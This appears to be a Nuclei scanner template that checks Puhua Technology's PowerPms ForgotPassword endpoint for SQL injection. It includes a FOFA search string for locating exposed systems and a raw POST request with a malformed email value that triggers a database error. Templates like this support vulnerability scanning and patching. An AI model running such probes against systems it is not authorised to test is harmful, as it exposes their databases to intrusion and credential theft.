id: powerpms-forgotpassword-sqli

info:
  name: 普华科技PowerPms ForgotPassword 接口SQL注入漏洞
  author: 0dayPoc
  severity: high
  description: |-
    fofa: body="Power.login.init"&&body="Power.ui.warning" && body="Power_login_btn"
      漏洞描述：普华科技PowerPms系统在ForgotPassword接口处理逻辑中存在SQL语法解析缺陷，攻击者可通过构造恶意输入参数触发SQL注入攻击，实现数据库查询操控及敏感数据泄露。该漏洞允许未经授权的数据库操作，可能造成凭证泄露、数据篡改或服务可用性受损。
  tags: 普华科技PowerPms

http:
- raw:
  - |
    POST /Account/ForgotPassword HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded

    email=%202
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
    - 'SQL'
  - type: word
    part: body
    words:
    - 'Code'
